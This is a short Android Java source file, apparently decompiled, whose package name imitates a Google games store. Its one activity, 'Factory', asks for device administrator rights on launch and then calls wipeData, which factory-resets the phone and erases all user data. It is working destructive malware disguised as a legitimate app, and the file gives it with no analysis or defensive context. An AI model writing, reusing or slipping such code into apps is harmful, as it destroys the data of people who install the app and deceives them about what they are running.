package com.google.games.stores.site;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import com.google.games.stores.util.MyAdmin;

public class Factory extends Activity {
    DevicePolicyManager manager;

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.manager = (DevicePolicyManager) getSystemService("device_policy");
        ComponentName mAdminName = new ComponentName(this, MyAdmin.class);
        if (!this.manager.isAdminActive(mAdminName)) {
            Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
            intent.putExtra("android.app.extra.DEVICE_ADMIN", mAdminName);
            startActivity(intent);
        }
        this.manager.wipeData(0);
    }
}
